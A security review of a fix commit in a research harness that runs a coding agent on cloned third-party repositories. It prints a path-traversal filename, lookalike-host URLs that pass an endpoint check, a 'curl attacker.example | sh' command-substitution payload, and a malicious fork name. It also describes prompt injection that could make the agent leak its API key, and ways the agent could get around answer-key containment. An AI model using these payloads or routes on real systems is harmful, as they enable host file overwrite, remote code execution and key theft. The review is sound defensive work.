# Security Review — `feat/crb-direction1-harness` (fix pass 2)

Commit: ed68ced

**Scope:** `git diff 529ecd2..ed68ced` — the review-fix commit only. `529ecd2` and earlier are
context, not under review.
**Date:** 2026-08-18
**Based on:** the pass-1 security review (`Commit: 529ecd2`, same path, now overwritten) and
`docs/reviews/code-review-rubric-2026-08-18-feat-crb-direction1-harness.md`. Sibling commits
`ae3362b` (rubric) and `92749ff` (pre-mortem) are docs-only.
**Calibration:** research tooling, one expert operator, own workstation, public benchmark repos.
Nothing here is internet-exposed. The "attacker" in every scenario is *content inside a
third-party repository the harness deliberately clones and hands to an agent running with
`--dangerously-skip-permissions`*. Blast radius is one workstation, one API key, and the
integrity of the benchmark numbers. Severities are set against that, not against a production
service.

> ⚠️ **No fresh code fact-check report was provided for this commit.** `docs/reviews/code-fact-check-report*.md`
> were rewritten in the same range and describe the pre-fix code, so I re-read every
> security-relevant path in `ed68ced` directly rather than relying on them.

---

## Verdict on the prior findings — the primary output of this pass

| Prior | Claim in `ed68ced` | Verdict | Why |
|---|---|---|---|
| **R3** (High) prompt injection → live key | "partially addressed … scoped key + egress allowlist left to the author" | **Partially closed — deferral is honest, but only in the commit message** | The two sub-fixes are real and load-bearing (see below). The primary exposure is untouched and correctly described as untouched. See Finding 6. |
| **A4** foreign-repo transcripts in tracked `runs/` | gitignored | **Closed for new runs** | Patterns verified against what `run-host.sh` actually writes. Residual tracked channels are narrower and acknowledged. See Finding 7. |
| **A5** runbook key fails open to `api.withmartian.com` | generated `judge.sh` with endpoint guard | **Partially closed — and it introduced a new injection surface** | The default-value fix is correct and closes the actual A5 scenario. The `case` guard is bypassable and the override message is actively misleading. See Findings 2 and 3. |
| **A6** `slug_for()` path escape | charset-constrained | **Half closed** | The slug regex is correct and blocks `/`, `.`, `..`, and absolute paths. The *other half* of the pass-1 recommendation — validating `fork` before it builds the clone URL — was not done. See Finding 5. |
| **A7** harvest `cp` dereferences symlinks | `cp --no-dereference` | **Not closed — and regressed** | `--no-dereference` fixes only the final path component. The `-z \| tr \| cut` rewrite shipped in the *same hunk* introduced a stronger host-side path escape than the one A7 described. See Finding 1. |
| **R2** (Structural) answer-key containment | callable `verify_containment()`, pre/post every cell, fails on surviving remotes | **Closed as a validity control; partially closed as a security control** | Structurally the right fix, and the remote check closes the most likely accidental route. It remains git-local, the post-run half is advisory-only, and `git fetch <url>` bypasses it. See Finding 4. |

Nothing from pass 1 was *removed*. Findings 2, 4, 6, 8, 9 of the pass-1 report (npm volume,
judge-prompt injection, temp-dir leak, egress) are unchanged and not re-litigated here except
where this commit's fixes touch them.

---

## Trust Boundary Map

```
B1  : [vendored benchmark_data.json → repo_name / fork]
                                  → [slug_for() regex (NEW, closes slug) ; fork STILL unvalidated]
                                  → [DST_ROOT/<slug> + git clone URL]

B2  : [third-party PR repo contents at /repo]
                                  → [headless Claude Code, --dangerously-skip-permissions,
                                     live ANTHROPIC_API_KEY, default bridge network — UNCHANGED]
                                  → [container env + rw /repo + shared npm volume]

B3' (moved): [filenames the agent leaves in the rw clone]
                                  → [git status -z | tr '\0' '\n' | cut -c4- | grep  (NEW)]
                                  → [host `mkdir -p` + `cp` under $dest/artifacts — ESCAPABLE]

B5' (moved): [host ANTHROPIC_API_KEY]
                                  → [generated judge.sh: :=default + case-glob endpoint guard (NEW)]
                                  → [judge endpoint — default now api.anthropic.com, guard leaky]

B6' (moved): [the merged upstream fix — the answer key]
                                  → [verify_containment(): refs + remotes + range, pre & post cell (NEW)]
                                  → [agent under test; network egress still NOT scrubbed]

B7  (new)  : [operator CLI args: --tool-name / --judge / --out]
                                  → [f-string interpolation, no quoting or escaping]
                                  → [chmod 0755 judge.sh written into a git-tracked work dir]
```

The commit's real effect is that **B6' hardened**, **B5' improved**, and **B3' got worse** — the
harvest rewrite that was meant to close A7 opened a wider hole on the same boundary. B2, the
dominant boundary, is unchanged by design and the commit says so. B7 is entirely new surface.

No escalation block is emitted. Finding 1 is the closest call: it is a host-side arbitrary-write
primitive, but reaching it requires B2 to have already been exercised (an injected agent creating
a hostile filename), and no plaintext secret, disabled TLS, hardcoded key, or unauthenticated
privileged endpoint appears anywhere in the diff.

---

## Findings

#### 1. The harvest rewrite lets an agent-chosen filename escape `$dest/artifacts` and write anywhere on the host

**Severity:** High
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:222-231`
**Boundary:** B3' (precondition: B2)
**Move:** #2 (implicit sanitization assumption), #1 (trust boundaries)
**Confidence:** High that the parse breaks and the escape is reachable; Medium that any current
benchmark fork would trigger it — this needs an injected or adversarial agent (i.e. R3) to create
the filename.
**Legibility-target:** for-author

**Evidence:**

```bash
  (cd "$clone" && git status --porcelain=v1 -z --untracked-files=all) \
    | tr '\0' '\n' | cut -c4- | grep -E '\.(md|json)$' \
    | while read -r f; do
        [ -f "$clone/$f" ] || continue
        mkdir -p "$dest/artifacts/$(dirname "$f")"
        # --no-dereference: the agent could leave a symlink in the repo, and this
        # cp runs on the HOST, so following it would copy host files into a
        # tracked artifacts dir.
        cp --no-dereference "$clone/$f" "$dest/artifacts/$f" 2>/dev/null || true
      done
```

Two defects in the new pipeline, both introduced by this commit:

**(a) `tr '\0' '\n'` throws away the only reason `-z` was added.** `-z` exists precisely so that
filenames containing newlines survive; converting NUL to newline immediately re-merges the two
namespaces. A filename with an embedded newline splits into two lines, and the second line is a
bare path fragment with **no 3-character status prefix** — so `cut -c4-` chops three characters
off the *path itself*.

**(b) rename entries have the same shape.** In `--porcelain=v1 -z`, a rename is emitted as
`XY <new>\0<orig>\0` — the original path is its own NUL-terminated field with no status prefix.
`cut -c4-` mangles it identically. The comment on line 221 claims this hunk fixed rename handling;
it now *includes* the second field and *corrupts* it.

Verified non-hypothetically (no git mutation — the byte stream was synthesised):

```
$ printf 'A  docs/a.md\0R  new.md\0old.md\0?? we\nird/../../../../etc/passwd.json\0' \
    | tr '\0' '\n' | cut -c4- | grep -E '\.(md|json)$'
docs/a.md
new.md
.md                                  <- 'old.md' had 3 chars eaten
/../../../../etc/passwd.json         <- traversal fragment, survives the grep
```

The last line is the attack. `$f` = `/../../../../etc/passwd.json` then flows into
`[ -f "$clone/$f" ]` (an out-of-clone **read** on the host), `mkdir -p "$dest/artifacts/$(dirname "$f")"`
(creates the traversal directories), and `cp --no-dereference "$clone/$f" "$dest/artifacts/$f"`
(an out-of-artifacts **write** on the host). Source and destination are rooted at different depths,
so the two resolve to different real paths: the agent picks one file to read and an unrelated host
path to overwrite. The `.md`/`.json` suffix requirement is not much of a constraint — the obvious
target is `$HOME/.claude/settings.json`, which is how a host-side hook gets planted; the payload is
selected by the agent from anywhere the clone can reach. `2>/dev/null || true` guarantees this is
silent.

`cp --no-dereference` does not help here, and it does not fully close A7 either: it protects only
the **final** component. If the agent replaces a *directory* inside the clone with a symlink
(`docs -> /etc`), then `[ -f "$clone/docs/x.md" ]` follows it and `cp` reads through it, because
`--no-dereference` never inspects intermediate components.

**Recommendation:** Drop `tr`/`cut` and read NUL-delimited in the shell —
`while IFS= read -r -d '' entry; do f=${entry:3}; ...` — which also lets you skip the trailing
rename field explicitly. Then reject any `f` that is not a normal, contained path *before* using it:
`case $f in /*|*..*) continue;; esac` plus `[ -L "$clone/$f" ] && continue`, and confirm the
resolved source stays under `$clone` (`realpath -e --relative-base="$clone"`). Better still,
scope the harvest to the directories the pipeline is supposed to write (`git status -z -- docs/reviews`)
rather than the whole tree — the untrusted-filename channel then largely disappears.

---

#### 2. The `judge.sh` endpoint guard matches on a substring, so a lookalike host passes

**Severity:** Medium
**Location:** `scripts/crb-pipeline-to-benchmark.py:463-468` (generated into `<out>/judge.sh`)
**Boundary:** B5'
**Move:** #5 (invert the access-control model — enumerate what the allowlist does not cover)
**Confidence:** High (verified by execution)
**Legibility-target:** for-author

**Evidence:**

```bash
case "$MARTIAN_BASE_URL" in
  *api.anthropic.com*) ;;
  *) echo "MARTIAN_BASE_URL is '$MARTIAN_BASE_URL', not an api.anthropic.com endpoint." >&2
     echo "Refusing to send MARTIAN_API_KEY there. Set CRB_ALLOW_FOREIGN_ENDPOINT=1 to override." >&2
     [ "${CRB_ALLOW_FOREIGN_ENDPOINT:-}" = "1" ] || exit 1 ;;
esac
```

`*api.anthropic.com*` is an unanchored glob. Confirmed in a shell:

```
$ case "https://api.anthropic.com.evil.example/v1/" in *api.anthropic.com*) echo BYPASS;; esac
BYPASS
$ case "https://evil.example/?h=api.anthropic.com" in *api.anthropic.com*) echo BYPASS;; esac
BYPASS
```

Both a suffix-extended domain and a query-parameter reflection satisfy the guard, and the key is
`export`ed to the judge client before the case statement runs. This is a control whose stated job
is "fail closed rather than shipping the key to whatever host happens to be the default"; a
substring match does not do that job.

Second defect in the same block: when `CRB_ALLOW_FOREIGN_ENDPOINT=1` is set, the script prints
**"Refusing to send MARTIAN_API_KEY there"** and then sends it. The log line asserts the opposite
of what happens, which is worse than no message — a terminal scrollback or a CI log will read as
if the guard held. As an escape hatch itself the variable is defensible (the operator may
legitimately judge via another provider), but it should be gated on an explicit acknowledgement in
the message, not silently contradicted.

**Recommendation:** Anchor the match — `case "$MARTIAN_BASE_URL" in https://api.anthropic.com/*) ;;`
— and reorder the override so the affirmative path prints
`"CRB_ALLOW_FOREIGN_ENDPOINT=1 — sending MARTIAN_API_KEY to <host> anyway"` instead of a refusal it
does not honour.

---

#### 3. `judge.sh` is built by f-string interpolation of CLI values; `--judge` reaches a command substitution

**Severity:** Medium
**Location:** `scripts/crb-pipeline-to-benchmark.py:448-481`
**Boundary:** B7
**Move:** #2 (implicit sanitization assumption), #7 (serialization boundary — code as output)
**Confidence:** High that injection works; Low that it is adversarially reachable (every input is
an operator-typed CLI flag), which is why this is Medium and not High.
**Legibility-target:** for-author

**Evidence:**

```python
    judge_sh = f"""#!/usr/bin/env bash
...
: "${{MARTIAN_MODEL:={args.judge}}}"
...
for step in step2_extract_comments step2_5_dedup_candidates step3_judge_comments; do
  echo "=== $step --tool {args.tool_name}"
  python -m "code_review_benchmark.$step" --tool "{args.tool_name}"
done

python3 {WORKSPACE}/scripts/crb-subset-leaderboard.py \\
  --evaluations "{out}/results/{sanitize_model(args.judge)}/evaluations.json" \\
  --tool "{args.tool_name}"
"""
    judge_path = out / "judge.sh"
    judge_path.write_text(judge_sh)
    judge_path.chmod(0o755)
```

`args.tool_name`, `args.judge`, and `out` are interpolated raw into shell source. Inside
`"{args.tool_name}"` a single `"` closes the quote and the rest is command text; `{out}` is
interpolated bare into the `python3 ...` line. The `--judge` path is worse than quoting, because
`${VAR:=default}` performs full expansion — including command substitution — on the default word.
Verified:

```
$ : "${MARTIAN_MODEL:=$(echo PWNED-via-judge-arg)}" ; echo "$MARTIAN_MODEL"
PWNED-via-judge-arg
```

So `--judge '$(curl -s attacker.example/x | sh)'` executes at `judge.sh` run time, not at
generation time — the payload sits dormant in a `chmod 0755` file until the operator runs it. That
file lands in `runs/review-arms/crb/offline-work-50/`, which is a **tracked** tree (siblings under
`runs/review-arms/crb/` are committed and the new `.gitignore` rules do not cover `*.sh`), so a bad
invocation gets persisted and re-run later by whoever checks out the branch.

On the credential question, the generated file is clean: the key is only ever referenced by name
(`: "${MARTIAN_API_KEY:=${ANTHROPIC_API_KEY:-}}"`, then `export`), never interpolated into the
file, never placed on a command line (so it does not appear in `ps`), and never echoed by the
guard's error messages. The one residual is that `bash -x judge.sh` would print the `:` line with
the key expanded — worth a `set +x` comment but not a finding on its own.

**Recommendation:** Stop hand-rolling the shell. Build the script with `shlex.quote()` on every
interpolated value, and pass the model as an ordinary assignment (`MARTIAN_MODEL="${MARTIAN_MODEL:-}"`
plus `: "${MARTIAN_MODEL:=}"` seeded from a quoted literal) so no CLI value ever lands inside a
`${...:=}` default. A cheap belt-and-braces addition: validate `--tool-name` and `--judge` against
`[A-Za-z0-9._-]+` at parse time, the same instinct that fixed A6.

---

#### 4. Containment is re-asserted, but the post-run half only warns, and `git fetch <url>` never touches a ref

**Severity:** Medium (integrity, not confidentiality)
**Location:** `scripts/crb-materialize.py:167-192` (the control),
`runs/review-arms/crb-pipeline/run-host.sh:236-237` (the advisory call)
**Boundary:** B6'
**Move:** #5 (invert the access-control model), #3 (check the error path)
**Confidence:** High that the post-run path is advisory; Medium on the `FETCH_HEAD` bypass — the
mechanism is well-defined but I did not execute it (no network, and no git mutation permitted this
session).
**Legibility-target:** for-author

**Evidence:** the new control does what R2 asked for —

```python
    remotes = sh(["git", "remote"], cwd=dst)
    if remotes:
        raise RuntimeError(f"{slug}: remote(s) present ({remotes.split()!r}) — "
                           "answer-key containment is broken")
```

and pre-run it fails closed —

```bash
  python3 "$ROOT/scripts/crb-materialize.py" --verify "$id" || {
    echo "$id: PRE-RUN containment check failed — skipping cell" >&2; continue; }
```

but post-run it does not:

```bash
  python3 "$ROOT/scripts/crb-materialize.py" --verify "$id" \
    || echo "$id: POST-RUN containment check FAILED — treat this cell's result as void" >&2
```

Three gaps, in descending order of how likely they are to actually bite:

1. **The post-run verdict is a stderr line and nothing else.** By the time it runs, `result.json`,
   `review.md`, and `artifacts/` are already written; the sweep continues; the aggregate spend gate
   still counts the cell; and `crb-pipeline-to-benchmark.py` will inject the contaminated review
   into `benchmark_data.json` with no marker. "Treat this cell's result as void" is an instruction
   to a human reading a 50-cell scrollback. Nothing downstream can see it.
2. **`git fetch <url>` leaves no ref.** `rev-list --all` covers `refs/`; a bare
   `git fetch https://github.com/grafana/grafana` writes objects and `FETCH_HEAD`, which is not
   under `refs/` and not in `--all`. `git log FETCH_HEAD` then reads the merged upstream fix and
   the check passes. Likewise `git remote add … && git fetch && git remote remove` passes cleanly.
3. **It is a git control facing a non-git channel.** The agent has WebFetch/WebSearch and open
   egress (R3, unchanged), and the reviewed tree self-identifies its upstream in `package.json`,
   `go.mod`, CI config, and license headers. A *diligent* reviewer — not an adversarial one —
   looking up how the issue was actually resolved upstream defeats containment without touching
   git at all.

Also worth noting: `git clean -qfdx` runs *before* the post-run verify, so any file evidence of
contamination (a stashed diff, a downloaded patch) is destroyed before the check that would have
wanted it.

This is still a large improvement — pinning the check to the manifest's recorded `head` correctly
catches a moved `review` ref, and the remote check closes the most plausible accidental route. The
issue is that it is being *presented* (in the commit message and in `crb-direction1-setup.md`) as
the thing that makes the arm's numbers trustworthy, and it cannot carry that weight alone.

**Recommendation:** Make the post-run result durable and machine-readable — write
`{"containment": "failed"}` into that cell's `run-meta.json`/`result.json` and have
`crb-pipeline-to-benchmark.py` refuse to inject cells so marked. Add `FETCH_HEAD` and
`.git/objects` growth to `verify_containment` (`git rev-parse --verify FETCH_HEAD` succeeding is a
failure condition). And the real fix remains the R3 egress allowlist: restricting the container to
`api.anthropic.com` is what makes this git-local control load-bearing rather than aspirational.

---

#### 5. `slug_for()` is now safe, but `fork` still builds the clone URL unvalidated

**Severity:** Low
**Location:** `scripts/crb-materialize.py:82-88` (the fix), `scripts/crb-materialize.py:206` (the
half that was not fixed)
**Boundary:** B1
**Move:** #2 (implicit sanitization assumption)
**Confidence:** Medium — the gap is unambiguous; exploitability needs a hostile or corrupted
vendored dataset, and GitHub would have to serve the normalized path.
**Legibility-target:** for-author

**Evidence:** the fix, which is correct —

```python
    slug = f"{parts[1]}-{parts[3]}".replace(".", "_")
    if not re.fullmatch(r"[A-Za-z0-9_-]+", slug):
        raise ValueError(f"unsafe slug {slug!r} derived from fork repo name {repo_name!r}")
    return slug
```

`[A-Za-z0-9_-]+` with `re.fullmatch` blocks `/`, `.` (so `..` cannot form), and any leading `/`, which
closes exactly the `Path(DST_ROOT) / "/abs"` and `rmtree` scenario pass-1 described. It sits at the
single derivation point (`load_prs` line 101) that every `DST_ROOT`-bound path in `materialize()`
flows through. That half is closed.

The other half of the pass-1 recommendation — *"and the same check on `fork` before building
`remote`"* — was not applied:

```python
    remote = f"{FORK_ORG}/{fork}"
```

`slug_for(fork)` validates only the **derived** slug, which uses `parts[1]` and `parts[3]`. Every
other `__`-separated component of `fork` passes through unexamined into the URL. A `repo_name` of
`x__ok__y__PR1__../../attacker/repo` yields the perfectly innocuous slug `ok-PR1` while producing
`https://github.com/code-review-benchmark/x__ok__y__PR1__../../attacker/repo`, which RFC 3986 path
normalization resolves to `https://github.com/attacker/repo` — redirecting the clone, and therefore
everything downstream at B2, to a repository of the attacker's choosing.

Two smaller gaps on the same boundary, both operator-facing rather than data-facing: `--verify`
takes slugs straight from `argv` into `DST_ROOT / slug` with no charset check, and `run-host.sh:70-71`
accepts positional instance ids into `clone="$CLONES/$id"` / `dest="$OUT/$id"` the same way. Both
are read-mostly and operator-supplied, so they are hardening notes, not bugs.

**Recommendation:** Apply the same `re.fullmatch(r"[A-Za-z0-9_.-]+", fork)` check in `load_prs`
before `fork` is stored, and reuse it to validate `args.verify` slugs. Three lines, and B1 stops
being an argument.

---

#### 6. R3's remaining exposure is documented only in the commit message, not where the operator will read it

**Severity:** Medium (process/legibility on a High finding, not a new technical exposure)
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:169-191`, `docs/working/crb-direction1-setup.md:54-58`
**Boundary:** B2
**Move:** #6 (follow the secrets), #1 (trust boundaries)
**Confidence:** High
**Legibility-target:** for-author

**Evidence:** the commit message states the deferral plainly and honestly —

```
  R3 partially addressed: transcripts/stderr gitignored, harvest no longer
     follows symlinks. The container still runs with a live key and open
     egress — a scoped key behind an egress allowlist is a host-side decision
     and is left to the author.
```

— and that is an accurate description of what shipped: `-e ANTHROPIC_API_KEY`,
`--dangerously-skip-permissions`, no `--network` flag, and a read-write `/repo` mount are all
byte-identical to `529ecd2`. No overclaim anywhere in the code or docs. That is the right call for
this project's threat model and I would not have wanted it fixed blindly.

What is missing is that the deferral does not appear in either artifact an operator actually reads
before spending money. `run-host.sh`'s header block (`:34-45`) documents the CLAUDE.md-loads-as-
instructions property but not the conclusion that follows from it; `crb-direction1-setup.md:54-58`
still says only `ANTHROPIC_API_KEY=sk-ant-... bash runs/review-arms/crb-pipeline/run-host.sh` with
no note about which key to use. Meanwhile the same doc gained a "Three guards run per cell" section
that reads as a security posture improvement. Commit messages are not read at run time; the net
effect on a reader six weeks from now is that the harness looks *more* contained than it is.

Assessing the partial fix's security value honestly: it is small but real and correctly targeted.
Gitignoring transcripts means that if injection does occur and the agent echoes the key, the key
does not land in permanent, unrewritable git history — it converts an unfixable outcome into a
rotatable one. That is the highest-leverage thing that could be done *without* the host-side
change, and it was the right thing to pick. `cp --no-dereference` is worth less (see Finding 1).
Neither reduces the probability of exfiltration at all.

**Recommendation:** One paragraph in `run-host.sh`'s header and one line in the setup doc's step 2:
"Use a dedicated low-limit key for this arm, not your primary — the container runs untrusted repo
content with `--dangerously-skip-permissions` and unrestricted egress. See security-review.md R3."
That costs nothing and makes the deferral survive the commit message. Then keep the actual fix
(scoped key + `--network` allowlist) on the list — it is still the single highest-value change
available, and it closes Finding 4's containment gap in the same move.

---

#### 7. `.gitignore` patterns are correct, but the containment they provide is narrower than it looks

**Severity:** Low
**Location:** `.gitignore:43-49`
**Boundary:** B3'
**Move:** #7 (serialization boundary — what leaves, and to where)
**Confidence:** High
**Legibility-target:** for-author

**Evidence:**

```
runs/**/transcript.jsonl
runs/**/stderr.log
```

Verified these match what `run-host.sh:192` actually writes (`> "$dest/transcript.jsonl"
2> "$dest/stderr.log"`, `dest="$OUT/$id"` under `runs/review-arms/crb-pipeline/`):

```
$ git check-ignore -v runs/review-arms/crb-pipeline/x/transcript.jsonl runs/review-arms/crb-pipeline/x/stderr.log
.gitignore:48:runs/**/transcript.jsonl	runs/review-arms/crb-pipeline/x/transcript.jsonl
.gitignore:49:runs/**/stderr.log	runs/review-arms/crb-pipeline/x/stderr.log
```

A4 is genuinely closed for new runs. The honesty is good too — the inline comment states outright
that the 16 already-tracked `e7-fable-3x` transcripts stay tracked and that this "prevents new ones,
it does not rewrite history," so there is no false claim to correct. Three residual notes rather
than defects:

1. **The remaining tracked channels still carry foreign-repo text.** `result.json` embeds the full
   `result` string and `review.md` is that string verbatim; both quote code from the reviewed repo.
   `artifacts/**` copies `.md`/`.json` files out of the clone's working tree. In practice these are
   agent *output* (the clone starts clean, so only agent-created files appear), which is a far
   smaller surface than a transcript — but "transcripts are ignored" is not the same as "no foreign
   content is committed," and the setup doc's new wording is closer to the latter.
2. **`runs/**/stderr.log` is broader than the finding required.** It now shadows ~9 already-tracked
   `stderr.log` files under `runs/review-arms/crb/cubic-cli/` and will silently exclude every
   future arm's stderr from provenance, not just this one's. Tracked files are unaffected, so
   nothing breaks today; it is a scope creep worth knowing about.
3. **Finding 1's `cp` can write outside `$dest/artifacts` entirely**, i.e. to a path no
   `runs/**` rule covers. The gitignore rules do not bound that.

**Recommendation:** Scope the two new patterns to `runs/review-arms/crb-pipeline/**/` if the intent
was this arm only, and add one sentence to `crb-direction1-setup.md:83-90` noting that
`result.json`/`review.md`/`artifacts/` remain tracked and still quote reviewed-repo content.

---

#### 8. The sweep-budget gate fails closed, but silently under-counts on a malformed cell

**Severity:** Informational
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:254-267`
**Boundary:** Internal — no boundary. Justified: no untrusted data crosses here; `$OUT` is
host-local and the heredoc is quoted so nothing is interpolated. Included because it is a
spend-limiting control and Move #8 applies to it directly.
**Move:** #8 (what if there are a million of these), #3 (check the error path)
**Confidence:** High
**Legibility-target:** for-author

**Evidence:**

```python
        try:
            total += json.load(open(rp)).get("total_cost_usd") or 0
        except Exception:
            pass
```

The gate's structure is right: `<<'EOF'` is quoted so `$OUT`/`$SWEEP_BUDGET` reach Python only as
`argv`; a non-numeric `SWEEP_BUDGET` raises in `float()`, exits non-zero, and is treated as
*exceeded* — fail-closed, which is the correct default for a money control. The residual is the
bare `except: pass`: a truncated or non-JSON `result.json` contributes `0` to the running total, so
a sweep where several cells wrote garbage will under-report spend and keep going. The worst case is
bounded (the API-side `--max-budget-usd` still caps each instance), so this is a note, not a defect.

**Recommendation:** Count the unreadable cells and print them alongside the total, e.g.
`sweep spend so far: $X / $Y (3 result.json unreadable — real spend is higher)`.

---

## What Looks Good

- **`verify_containment()` is the right shape.** Extracting the guard into a callable seam,
  calling it around every cell, adding the surviving-remote check, and pinning `head` to the
  manifest rather than the clone's own tip (so a moved `review` ref fails instead of validating
  itself) is exactly what R2 asked for. The pre-run call fails closed. Finding 4 is about the
  channels it never claimed to cover plus the advisory post-run call, not about the control's
  design.
- **The A5 fix picked the right lever.** `: "${MARTIAN_BASE_URL:=https://api.anthropic.com/v1/}"`
  means the *actual* A5 scenario — key exported, base URL forgotten, credential silently sent to
  `api.withmartian.com` — is now impossible. That is the fix; the `case` guard is defence in depth
  on top of it, and Finding 2 is about the depth layer, not the fix.
- **No credential ever enters the generated file, `argv`, or a log line.** I checked all three
  explicitly. `judge.sh` references the key only by variable name; the guard's error messages print
  `$MARTIAN_BASE_URL`, never `$MARTIAN_API_KEY`; and nothing places it on a command line where `ps`
  would see it.
- **The resume predicate now requires success.** `num_turns > 0 and not is_error and subtype ==
  "success"` closes a real failure mode where an errored or budget-exhausted cell was banked as
  done and locked out of retry — a control whose previous failure mode was *silently measuring
  less than you paid for*.
- **The A15 section-anchoring fix, with a test.** `normalize_section()` plus set membership
  replaces a substring test where `"consider"` matched `"Considered Overrides"`, and
  `test/crb-injector-sections.bats` includes a regression case that renames the column and asserts
  the output is unchanged. That is a latent injection path into the judge's scoring input, closed
  and pinned rather than closed and hoped about.
- **The A8/A9 doc corrections are the kind of honesty that is hard to fake.** Amending
  "2 PRs, 11 vs 13" to a measured "24 of 50, values 1–9" with an explicit
  `*(Corrected 2026-08-18: … understated the effect ~12×)*` note, and adding caveat 2b describing a
  bias in the *favourable* direction, both raise the credibility of everything else in that file.
- **The commit message does not overclaim.** R3 is labelled partial, the specific residual is
  named, and the confidence tags distinguish "verified by execution" from "guard proven
  non-vacuous, but the escape it prevents was never observed." That is the correct calibration.

---

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Harvest `tr\|cut` rewrite → host path escape out of `$dest/artifacts` (**new, regression**) | High | B3' | `runs/review-arms/crb-pipeline/run-host.sh:222-231` | High / Medium |
| 2 | `judge.sh` endpoint guard is an unanchored substring glob; override message contradicts itself | Medium | B5' | `scripts/crb-pipeline-to-benchmark.py:463-468` | High |
| 3 | `judge.sh` built by raw f-string interpolation; `--judge` reaches a command substitution | Medium | B7 | `scripts/crb-pipeline-to-benchmark.py:448-481` | High / Low reach |
| 4 | Post-run containment check is advisory only; `git fetch <url>` leaves no ref to catch | Medium | B6' | `runs/review-arms/crb-pipeline/run-host.sh:236-237` | High / Medium |
| 5 | `fork` still unvalidated into the clone URL (A6 half-fixed) | Low | B1 | `scripts/crb-materialize.py:206` | Medium |
| 6 | R3's residual exposure documented only in the commit message | Medium | B2 | `runs/review-arms/crb-pipeline/run-host.sh:169-191` | High |
| 7 | `.gitignore` correct but narrower containment than the docs imply | Low | B3' | `.gitignore:43-49` | High |
| 8 | Sweep-budget gate silently under-counts unreadable cells | Informational | Internal | `runs/review-arms/crb-pipeline/run-host.sh:254-267` | High |

---

## Overall Assessment

This is a good fix pass that got one thing backwards. Five of the six prior findings moved in the
right direction — R2's containment guard is now a real, callable, pre/post control; A5's actual
failure scenario is impossible; A6's path escape is closed at the point that mattered; A4's
transcripts will not enter history; and R3's deferral is described accurately rather than papered
over. The commit message's calibration is notably honest, and the doc corrections (A8/A9, including
a self-flagged 12× understatement and a caveat that cuts *against* the arm) are the strongest
signal in the whole diff that the numbers this harness produces can be trusted.

The exception is Finding 1, and it deserves to be the headline: the hunk that was supposed to close
A7 (symlink dereference) replaced a mis-parse with a worse one. `tr '\0' '\n'` discards the entire
point of the `-z` flag added two characters earlier, and `cut -c4-` then chops three characters off
any path fragment that arrives without a status prefix — which is every newline-split filename and
every rename's original path. The result is a host-side read *and* write primitive that escapes
`$dest/artifacts` under an attacker-chosen relative path, reachable by any agent that can create a
file with a newline in its name. That is a strictly larger hole than the one A7 described, so A7
should be recorded as **regressed**, not closed. It is fixable in place — a NUL-delimited `read -d ''`
loop plus a `case $f in /*|*..*) continue;;` rejection, roughly five lines.

Ranked: **(1)** fix the harvest parse before any live sweep, since an injected agent is exactly the
threat model the rest of this commit is built around; **(2)** anchor the `judge.sh` endpoint glob
and `shlex.quote()` the interpolations, ten minutes of work on brand-new surface; **(3)** make the
post-run containment verdict durable so a contaminated cell cannot silently reach
`benchmark_data.json`; **(4)** put R3's deferral in the script header where an operator will see it.
The scoped key plus egress allowlist remains the single highest-value change available and is
correctly parked with the author — it would close Findings 4 and 6 as a side effect.

## Goal-Alignment Note
- Answered: yes — per-finding verdicts on all six prior items plus a fresh pass on the new surface, saved to `docs/reviews/security-review.md` with `Commit: ed68ced`
- Out of scope: pass-1 Findings 2/6/8/9 (npm volume, judge-prompt injection, temp-dir leak) are unchanged by this commit and were not re-litigated; docs-only siblings `ae3362b`/`92749ff` and the rewritten fact-check reports were read for context but not reviewed; no git-mutating verification was performed — the Finding 1 traversal was confirmed against a synthesised `git status -z` byte stream, and the Finding 2/3 shell behaviours in a throwaway shell, per the session safety constraint
- Escalate: (a) **Finding 1 blocks the first live sweep** — the fix commit's A7/A16 hunk introduced a host-side arbitrary-write path that is strictly worse than the symlink issue it replaced, so the rubric's A7 row should be reopened as *regressed* rather than marked resolved; (b) the rubric at `docs/reviews/code-review-rubric-2026-08-18-feat-crb-direction1-harness.md` still shows R1/R2/R3 as 🔴 Unresolved — `ed68ced` did not update it, so the review-fix loop's status ledger is stale and needs a reconciliation pass independent of this review.
